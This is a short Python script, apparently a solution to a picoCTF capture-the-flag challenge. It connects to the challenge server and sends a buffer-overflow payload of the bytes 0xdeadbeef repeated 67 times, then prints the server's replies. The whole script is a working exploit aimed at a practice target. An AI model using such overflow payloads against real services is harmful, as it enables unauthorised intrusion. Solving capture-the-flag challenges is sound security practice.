import socket


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect(('mars.picoctf.net', 31890))
    data = s.recv(1024)
    data = s.recv(1024)

    s.sendall(b'\xef\xbe\xad\xde' * 0x43 + b'\n')

    data = s.recv(1024)
    print(data)
    data = s.recv(1024)
    print(data)
except Exception as e:
    print(e)
finally:
    s.close()
